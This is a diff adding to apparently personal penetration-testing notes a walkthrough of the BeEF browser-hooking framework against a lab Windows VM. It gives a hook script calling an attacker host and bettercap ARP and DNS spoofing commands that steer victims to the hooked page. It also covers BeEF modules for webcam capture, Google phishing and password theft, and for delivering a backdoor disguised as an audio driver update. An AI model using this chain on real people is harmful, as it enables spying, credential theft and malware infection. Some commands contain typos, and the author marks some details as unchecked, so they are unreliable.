@@ -464,4 +464,132 @@ After installing the file you can run the App which is called MainActivity.
 
 **BeEF Framework**
 
+Start beef
+```sh
+sudo beef-xss
+```
+
+Login details:
+User: beef
+Pass: asks you to create one when you first launch the framework
+
+Beef will display a local address that you copy and launch in your browser:
+```sh
+127.0.0.1:3000/ui/panel
+```
+
+In the same section it tells you your beef hook which you use to hook targets browsers.:
+```java
+<script src="http://<attacker-ip>:3000/hook.js"></script>
+```
+
+How to insatll
+```sh
+sudo apt install beef-xss
+```
+
+We can test it on our Windows VM. Make sure to switch Kali back to Nat Network. 
+
+We can put our hook in the html file on our server. We'll make a simple page and add our hook to the code.
+
+```html
+<h1>Hello From My Basic Webpage!</h1>
+<script src="http://<attacker-ip>:3000/hook.js"></script>
+```
+
+We could use bettercap to redirect a target to our new beef hook web-page:
+
+Start bettercap
+```sh
+sudo bettercap -iface eth0
+```
+
+Start probe
+```sh
+net.probe on
+```
+
+Show network details
+```sh
+net.show
+```
+
+Set target (i may need to activate full duplex)
+```sh
+set net.spoof.targets <target-ip>
+```
+
+Start spoof
+```sh
+net.spoof on
+```
+
+Optionally, start sniffing the network
+```sh
+net.sniff on
+```
+
+Start our Kali server
+```sh
+sudo service apach2 start
+```
+
+Setup the re-direction
+```sh
+set dns.spoof.domains mywebsite.com
+```
+- Here it would be better to use something like `google.com` as the domain. You could also use a tool, like SET or httrack, to create a copy of google.com so it looks more legit.
+
+Start DNS spoof 
+```sh
+dns.spoof on
+```
+
+Start beef
+```sh
+sudo beef-xss
+```
+
+Now we can go to `mywebsite.com` on the Windows VM which should add the computer to our beef panel UI. Try refreshing the beef panel if it doesn't show up.
+
+Some of the most important things that you can do in beef are located in the commands tab.
+
+Here are some of the commands:
+- Spider Eye - Take a picture of the browser window.
+	- you can see the results in `module results history` by clicking on the command listed
+- WebCam HTML5 - Captures webcam images
+- Play Sound - Play a pre-selected sound from the attacker's PC
+- Create Alert  - Write a message to the victims browser
+
+Hacking a google account with phishing located in the commands tab under social engineering Google Phishing.
+
+![](img/google-phishing.png)
+
+We can also use the module Pretty Theft to try and gain passwords for various websites. It's located in the same place as the Google Phishing command. This will bring up a pop up box, not the full web-page.
+
+If you have sniffing running on bettercap and you have cloned a website with SET, you can always sniff the password as well because it won't be secure. 
+
+Fake Notification Bar (located in Social Engineering) - Attempt to get the target to install  a backdoor into their system.  
+
+Modify the command:
+```sh
+http://<attacker-ip>/<path-to-file>
+```
+- You'd rename the back-door to something like `audio_driver.exe`
+- I need to check this, but the default IP might be what is used here, not the attacker IP
+- You could then re-write the message to say something like "Your Audio Driver Needs Updating, Please Install"
+- You may need to remove the port in the default settings
+- I think you'd need to have apache2 serving the file for this to work.
+
+Another command to get something on the victims computer is `Lcamtuf Download`
+- Add the malicious file path.
+- This will automatically download the file without any user input.
+
+Another way is using `Fake Flash Update`
+
+As you can see there is a lot of things that can be done with just a few tools.
+
+
+
+
 
